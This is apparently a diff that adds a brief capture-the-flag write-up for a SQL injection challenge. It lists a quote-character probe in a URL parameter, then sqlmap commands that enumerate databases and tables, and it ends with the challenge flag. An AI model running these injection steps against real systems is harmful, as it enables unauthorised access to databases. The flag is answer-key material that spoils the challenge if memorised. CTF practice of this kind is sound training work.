@@ -1,0 +1,5 @@
+1) /user?id=' (in url)
+2)  sqlmap -u http://(url)/user?id=1
+3) sqlmap -u http://(url)/user?id=1 --dbs
+4) sqlmap -u http://(url)/user?id=1 -D public --tables
+'ctf{70ff919c37a20d6526b02e88c950271a45fa698b037e3fb898ca68295da'
